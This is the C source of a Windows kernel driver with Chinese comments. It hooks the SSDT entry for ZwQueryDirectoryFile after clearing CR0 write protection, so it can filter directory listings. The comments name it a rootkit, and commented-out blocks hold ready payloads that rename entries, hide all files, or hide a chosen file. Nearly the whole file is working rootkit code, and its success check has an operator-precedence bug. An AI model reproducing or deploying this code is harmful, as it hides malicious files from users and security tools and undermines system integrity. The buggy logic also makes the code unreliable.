#include "ntddk.h"
#include <windef.h>
#pragma pack(1)//写这个内存以一字节对齐                                           /* SSDT Table */
typedef struct ServiceDescriptorEntry {
	unsigned int	*ServiceTableBase;//ServiceTable ssdt数组
	unsigned int	*ServiceCounterTableBase;////仅适用于checked build版本
	unsigned int	NumberOfServices;//(ServiceTableBase)数组中的元素个数
	unsigned char	*ParamTableBase;//参数表基址
} ServiceDescriptorTableEntry_t, *PServiceDescriptorTableEntry_t;
#pragma pack()


__declspec( dllimport ) ServiceDescriptorTableEntry_t KeServiceDescriptorTable;

#define SYSTEMSERVICE( _function ) KeServiceDescriptorTable.ServiceTableBase[*(PULONG) ( (PUCHAR) _function + 1)] /* 数组下标从1开始不是从零开始 */

NTSTATUS DriverEntry( IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING RegistryPath );


VOID Unload( IN PDRIVER_OBJECT DriverObject );//卸载驱动的函数


/* 取代的新函数 */
NTSTATUS NTAPI NewZwQueryDirectoryFile(//返回有关给定文件句柄指定的目录中的文件的各种信息
	IN HANDLE FileHandle,//文件句柄，由NtCreateFile或NtOpenFile返回
	IN HANDLE Event OPTIONAL,//调用者创建的事件的可选句柄，可选参数
	IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,//与APC相关，可选参数，NUll
	IN PVOID ApcContext OPTIONAL,//与APC相关
	OUT PIO_STATUS_BLOCK IoStatusBlock,//指向IO_STATUS_BLOCK结构的指针，接收最终完成状态和有关操作的信息
	OUT PVOID FileInformation,//指向缓冲区的指针，该缓冲区接收有关文件的所需信息
	IN ULONG Length,//FileInformation指向的缓冲区大小（以字节为单位）
	IN FILE_INFORMATION_CLASS FileInformationClass,//包含文件信息的结构体
	IN BOOLEAN ReturnSingleEntry,//如果只返回一个条目，则设置为TRUE，否则为FALSE
	IN PUNICODE_STRING FileMask OPTIONAL,//指向调用者分配的Unicode字符串的可选指针，该字符串包含FileHandle指定的目录中的文件名（或多个文件，如果使用通配符）。 此参数是可选的，可以为NULL。
	IN BOOLEAN RestartScan );//如果要从目录中的第一个条目开始扫描，则设置为TRUE。 如果从先前恢复扫描，则设置为FALSE。


/* API 声明 */
NTSYSAPI NTSTATUS NTAPI ZwQueryDirectoryFile(
	IN HANDLE FileHandle,
	IN HANDLE Event OPTIONAL,
	IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,
	IN PVOID ApcContext OPTIONAL,
	OUT PIO_STATUS_BLOCK IoStatusBlock,
	OUT PVOID FileInformation,
	IN ULONG Length,
	IN FILE_INFORMATION_CLASS FileInformationClass,
	IN BOOLEAN ReturnSingleEntry,
	IN PUNICODE_STRING FileMask OPTIONAL,
	IN BOOLEAN RestartScan );


typedef NTSTATUS (*ZWQUERYDIRECTORYFILE)(
	IN HANDLE FileHandle,
	IN HANDLE Event OPTIONAL,
	IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,
	IN PVOID ApcContext OPTIONAL,
	OUT PIO_STATUS_BLOCK IoStatusBlock,
	OUT PVOID FileInformation,
	IN ULONG Length,
	IN FILE_INFORMATION_CLASS FileInformationClass,
	IN BOOLEAN ReturnSingleEntry,
	IN PUNICODE_STRING FileMask OPTIONAL,
	IN BOOLEAN RestartScan );


typedef struct _FILE_DIRECTORY_INFORMATION//查询目录中文件的详细信息
{
	ULONG		NextEntryOffset;//下一个文件目录信息入口点,到达末尾则为NULL
	ULONG		FileIndex;//父目录中文件的字节偏移量，可以随时更改以维护排序顺序。
	LARGE_INTEGER	CreationTime;//文件创建时间
	LARGE_INTEGER	LastAccessTime;//最后访问时间
	LARGE_INTEGER	LastWriteTime;
	LARGE_INTEGER	ChangeTime;
	LARGE_INTEGER	EndOfFile;//文件末尾的偏移量
	LARGE_INTEGER	AllocationSize;//文件分配大小
	ULONG		FileAttributes;//文件属性
	ULONG		FileNameLength;//文件名长度
	WCHAR		FileName[1];//指定文件名字符串的第一个字符
} FILE_DIRECTORY_INFORMATION, *PFILE_DIRECTORY_INFORMATION;


typedef struct _FILE_FULL_DIR_INFORMATION {//查询目录中文件的详细信息
	ULONG		NextEntryOffset;//下一个文件目录信息入口点,到达末尾则为NULL
	ULONG		FileIndex;//父目录中文件的字节偏移量，可以随时更改以维护排序顺序。
	LARGE_INTEGER	CreationTime;//文件创建时间
	LARGE_INTEGER	LastAccessTime;//最后访问时间
	LARGE_INTEGER	LastWriteTime;
	LARGE_INTEGER	ChangeTime;
	LARGE_INTEGER	EndOfFile;//文件末尾的偏移量
	LARGE_INTEGER	AllocationSize;//文件分配大小
	ULONG		FileAttributes;//文件属性
	ULONG		FileNameLength;//文件名长度
	ULONG		EaSize;//文件的扩展属性（EA）的组合长度（以字节为单位）
	WCHAR		FileName[1];//指定文件名字符串的第一个字符
} FILE_FULL_DIR_INFORMATION, *PFILE_FULL_DIR_INFORMATION;


typedef struct _FILE_ID_FULL_DIR_INFORMATION {
	ULONG		NextEntryOffset;
	ULONG		FileIndex;
	LARGE_INTEGER	CreationTime;
	LARGE_INTEGER	LastAccessTime;
	LARGE_INTEGER	LastWriteTime;
	LARGE_INTEGER	ChangeTime;
	LARGE_INTEGER	EndOfFile;
	LARGE_INTEGER	AllocationSize;
	ULONG		FileAttributes;
	ULONG		FileNameLength;
	ULONG		EaSize;
	LARGE_INTEGER	FileId;//文件的8字节文件引用号。
	WCHAR		FileName[1];
} FILE_ID_FULL_DIR_INFORMATION, *PFILE_ID_FULL_DIR_INFORMATION;


typedef struct _FILE_BOTH_DIR_INFORMATION {
	ULONG		NextEntryOffset;
	ULONG		FileIndex;
	LARGE_INTEGER	CreationTime;
	LARGE_INTEGER	LastAccessTime;
	LARGE_INTEGER	LastWriteTime;
	LARGE_INTEGER	ChangeTime;
	LARGE_INTEGER	EndOfFile;
	LARGE_INTEGER	AllocationSize;
	ULONG		FileAttributes;
	ULONG		FileNameLength;
	ULONG		EaSize;
	CCHAR		ShortNameLength;//指定短文件名字符串的长度（以字节为单位）
	WCHAR		ShortName[12];//Unicode字符串，包含文件的短名称。
	WCHAR		FileName[1];
} FILE_BOTH_DIR_INFORMATION, *PFILE_BOTH_DIR_INFORMATION;


typedef struct _FILE_ID_BOTH_DIR_INFORMATION {
	ULONG		NextEntryOffset;
	ULONG		FileIndex;
	LARGE_INTEGER	CreationTime;
	LARGE_INTEGER	LastAccessTime;
	LARGE_INTEGER	LastWriteTime;
	LARGE_INTEGER	ChangeTime;
	LARGE_INTEGER	EndOfFile;
	LARGE_INTEGER	AllocationSize;
	ULONG		FileAttributes;
	ULONG		FileNameLength;
	ULONG		EaSize;
	CCHAR		ShortNameLength;
	WCHAR		ShortName[12];
	LARGE_INTEGER	FileId;
	WCHAR		FileName[1];
} FILE_ID_BOTH_DIR_INFORMATION, *PFILE_ID_BOTH_DIR_INFORMATION;


typedef struct _FILE_NAMES_INFORMATION {
	ULONG	NextEntryOffset;
	ULONG	FileIndex;
	ULONG	FileNameLength;
	WCHAR	FileName[1];
} FILE_NAMES_INFORMATION, *PFILE_NAMES_INFORMATION;


/*
 * -----------------------------------------------------------------------------------------------------------
 * 源地址
 */
ZWQUERYDIRECTORYFILE OldZwQueryDirectoryFile = NULL;
DWORD GetNextEntryOffset( IN PVOID pData, IN FILE_INFORMATION_CLASS FileInfo );


void SetNextEntryOffset( IN PVOID pData, IN FILE_INFORMATION_CLASS FileInfo, IN DWORD Offset );


PVOID GetEntryFileName( IN PVOID pData, IN FILE_INFORMATION_CLASS FileInfo );


ULONG GetFileNameLength( IN PVOID pData, IN FILE_INFORMATION_CLASS FileInfo );


/* #include "Hidefile.h" */
NTSTATUS DriverEntry( IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING RegistryPath )
{
	NTSTATUS ntStatus = STATUS_SUCCESS;
	DriverObject->DriverUnload = Unload;
	KdPrint( ("Driver Entry Called!/n") );
	KdPrint( ("OldAddress原始函数地址值:0x%X/t新函数地址值NewAddress:0x%X/n", SYSTEMSERVICE( ZwQueryDirectoryFile ), NewZwQueryDirectoryFile) );

	__asm /* 去掉页面保护 */
	{
		cli
		mov eax, cr0
		and eax, not 10000h
		mov cr0, eax
	}

	OldZwQueryDirectoryFile = (ZWQUERYDIRECTORYFILE) SYSTEMSERVICE( ZwQueryDirectoryFile ); /* 将旧函数地址值保存备份 */
	DbgPrint( "改写函数地址前\n" );
	(ZWQUERYDIRECTORYFILE) SYSTEMSERVICE( ZwQueryDirectoryFile ) = NewZwQueryDirectoryFile; /* 将旧函数地址值改变为我们的函数地址入口值 */
	DbgPrint( "改写函数地址后\n" );

	__asm                                                                                   /* 恢复页面保护 */
	{
		mov eax, cr0
		or eax, 10000h
		mov cr0, eax
		    sti
	}

	return(ntStatus);
}


VOID Unload( IN PDRIVER_OBJECT DriverObject )
{
	KdPrint( ("Driver Unload Called!/n") );
	__asm /* 去掉页面保护 */
	{
		cli
		mov eax, cr0
		and eax, not 10000h
		mov cr0, eax
	}

	(ZWQUERYDIRECTORYFILE) SYSTEMSERVICE( ZwQueryDirectoryFile ) = OldZwQueryDirectoryFile;
	KdPrint( ("Address:0x%X/n", SYSTEMSERVICE( ZwQueryDirectoryFile ) ) );

	__asm /* 恢复页面保护 */
	{
		mov eax, cr0
		or eax, 10000h
		mov cr0, eax
		    sti
	}
	return;
}


DWORD GetNextEntryOffset( IN PVOID pData, IN FILE_INFORMATION_CLASS FileInfo )//获取不同类型的文件信息函数中下一个文件的地址
{
	DWORD result = 0;
	switch ( FileInfo )
	{
	case FileDirectoryInformation:
		result = ( (PFILE_DIRECTORY_INFORMATION) pData)->NextEntryOffset;
		break;
	case FileFullDirectoryInformation:
		result = ( (PFILE_FULL_DIR_INFORMATION) pData)->NextEntryOffset;
		break;
	case FileIdFullDirectoryInformation:
		result = ( (PFILE_ID_FULL_DIR_INFORMATION) pData)->NextEntryOffset;
		break;
	case FileBothDirectoryInformation:
		result = ( (PFILE_BOTH_DIR_INFORMATION) pData)->NextEntryOffset;
		break;
	case FileIdBothDirectoryInformation:
		result = ( (PFILE_ID_BOTH_DIR_INFORMATION) pData)->NextEntryOffset;
		break;
	case FileNamesInformation:
		result = ( (PFILE_NAMES_INFORMATION) pData)->NextEntryOffset;
		break;
	}
	return(result);
}


void SetNextEntryOffset( IN PVOID pData, IN FILE_INFORMATION_CLASS FileInfo, IN DWORD Offset )//修改文件信息结构体中下一个文件的地址
{
	switch ( FileInfo )
	{
	case FileDirectoryInformation:
		( (PFILE_DIRECTORY_INFORMATION) pData)->NextEntryOffset = Offset;
		break;
	case FileFullDirectoryInformation:
		( (PFILE_FULL_DIR_INFORMATION) pData)->NextEntryOffset = Offset;
		break;
	case FileIdFullDirectoryInformation:
		( (PFILE_ID_FULL_DIR_INFORMATION) pData)->NextEntryOffset = Offset;
		break;
	case FileBothDirectoryInformation:
		( (PFILE_BOTH_DIR_INFORMATION) pData)->NextEntryOffset = Offset;
		break;
	case FileIdBothDirectoryInformation:
		( (PFILE_ID_BOTH_DIR_INFORMATION) pData)->NextEntryOffset = Offset;
		break;
	case FileNamesInformation:
		( (PFILE_NAMES_INFORMATION) pData)->NextEntryOffset = Offset;
		break;
	}
}


PVOID GetEntryFileName( IN PVOID pData, IN FILE_INFORMATION_CLASS FileInfo )//获取文件名
{
	PVOID result = 0;
	switch ( FileInfo )
	{
	case FileDirectoryInformation:
		result = (PVOID) &( (PFILE_DIRECTORY_INFORMATION) pData)->FileName[0];
		break;
	case FileFullDirectoryInformation:
		result = (PVOID) &( (PFILE_FULL_DIR_INFORMATION) pData)->FileName[0];
		break;
	case FileIdFullDirectoryInformation:
		result = (PVOID) &( (PFILE_ID_FULL_DIR_INFORMATION) pData)->FileName[0];
		break;
	case FileBothDirectoryInformation:
		result = (PVOID) &( (PFILE_BOTH_DIR_INFORMATION) pData)->FileName[0];
		break;
	case FileIdBothDirectoryInformation:
		result = (PVOID) &( (PFILE_ID_BOTH_DIR_INFORMATION) pData)->FileName[0];
		break;
	case FileNamesInformation:
		result = (PVOID) &( (PFILE_NAMES_INFORMATION) pData)->FileName[0];
		break;
	}
	return(result);
}


ULONG GetFileNameLength( IN PVOID pData, IN FILE_INFORMATION_CLASS FileInfo )//获取文件名的长度
{
	ULONG result = 0;
	switch ( FileInfo )
	{
	case FileDirectoryInformation:
		result = (ULONG) ( (PFILE_DIRECTORY_INFORMATION) pData)->FileNameLength;
		break;
	case FileFullDirectoryInformation:
		result = (ULONG) ( (PFILE_FULL_DIR_INFORMATION) pData)->FileNameLength;
		break;
	case FileIdFullDirectoryInformation:
		result = (ULONG) ( (PFILE_ID_FULL_DIR_INFORMATION) pData)->FileNameLength;
		break;
	case FileBothDirectoryInformation:
		result = (ULONG) ( (PFILE_BOTH_DIR_INFORMATION) pData)->FileNameLength;
		break;
	case FileIdBothDirectoryInformation:
		result = (ULONG) ( (PFILE_ID_BOTH_DIR_INFORMATION) pData)->FileNameLength;
		break;
	case FileNamesInformation:
		result = (ULONG) ( (PFILE_NAMES_INFORMATION) pData)->FileNameLength;
		break;
	}
	return(result);
}


NTSTATUS NTAPI NewZwQueryDirectoryFile(
	IN HANDLE FileHandle,
	IN HANDLE Event OPTIONAL,
	IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,
	IN PVOID ApcContext OPTIONAL,
	OUT PIO_STATUS_BLOCK IoStatusBlock,
	OUT PVOID FileInformation,
	IN ULONG Length,
	IN FILE_INFORMATION_CLASS FileInformationClass,
	IN BOOLEAN ReturnSingleEntry,
	IN PUNICODE_STRING FileMask OPTIONAL,
	IN BOOLEAN RestartScan )
{
/* 首先，调用原始函数执行获取打开文件或目录得到信息 */
	NTSTATUS ntStatus = OldZwQueryDirectoryFile(
		FileHandle,
		Event,
		ApcRoutine,
		ApcContext,
		IoStatusBlock,
		FileInformation,
		Length,
		FileInformationClass,
		ReturnSingleEntry,
		FileMask,
		RestartScan );
	DbgPrint( "进入自己定义的函数内，并成功执行原函数代码\n" );


/* 这里判定函数是否执行成功，而且获取的是否是文件或目录 */
	if ( NT_SUCCESS( ntStatus ) &&
	     FileInformationClass == FileDirectoryInformation ||
	     FileInformationClass == FileFullDirectoryInformation ||
	     FileInformationClass == FileIdFullDirectoryInformation ||
	     FileInformationClass == FileBothDirectoryInformation ||
	     FileInformationClass == FileIdBothDirectoryInformation ||
	     FileInformationClass == FileNamesInformation
	     )
	{
		PVOID	p		= FileInformation;
		PVOID	pLast		= NULL;
		DWORD	pLastOne	= 0;
		PFILE_BOTH_DIR_INFORMATION pFileInfo;
		wchar_t* pwszUnicode ;
		int* q1;
		KdPrint( ("<--------/n") );
		do
		{
			pLastOne = GetNextEntryOffset( p, FileInformationClass );//获取下一个文件偏移
			KdPrint( ("[*]Last:0x%x/tCurrent:0x%x/tpLastOne:%ld/n", pLast, p, pLastOne) );
			/*用以混淆文件
			pFileInfo = p;
			pwszUnicode = pFileInfo->FileName;
			RtlCopyMemory(pwszUnicode,L"666",4);
			q1 = &(pFileInfo->FileNameLength);
			*q1 = 3;
			*/
			
			/*
			ntStatus = STATUS_NO_MORE_FILES;
			用以隐藏所有文件
			*/
			
			/*用以隐藏特定的文件
			if ( RtlCompareMemory( GetEntryFileName( p, FileInformationClass ), L"使用更新说明.txt", 16 ) == 16 ) // RootkitFile改为自己想要隐藏的文件名和目录名 
			{
				KdPrint( ("[-]Hide...../n") );
				KdPrint( ("[-]现在在目录下看不到RootkitFile命名的目录和文件了/n") );
				if ( pLastOne == 0 )//如果没有下一个文件
				{
					if ( p == FileInformation )//如果当前目录只有唯一文件
						ntStatus = STATUS_NO_MORE_FILES;//设置为没有更多文件
					else
						SetNextEntryOffset( pLast, FileInformationClass, 0 );//将前一文件的指向下一文件的指针置空
					break;
				}else  {//当前文件后有文件
					int	iPos	= ( (ULONG) p) - (ULONG) FileInformation;//获取相对偏移量
					int	iLeft	= (DWORD) Length - iPos - pLastOne;
					RtlCopyMemory( p, (PVOID) ( (char *) p + pLastOne), (DWORD) iLeft );//目的地址，源地址，长度
					KdPrint( ("iPos:%ld/tLength:%ld/tiLeft:%ld/t,NextOffset:%ld/tpLastOne:%ld/tCurrent:0x%x/n",
						  iPos, Length, iLeft, GetNextEntryOffset( p, FileInformationClass ), pLastOne, p) );
					continue;
				}
			}
			*/
			pLast	= p;//前一文件指针偏移
			p	= ( (char *) p + GetNextEntryOffset( p, FileInformationClass ) );//后置文件指针偏移
		}
		while ( pLastOne != 0 );
		KdPrint( ("-------->/n") );
	}
	return(ntStatus);
}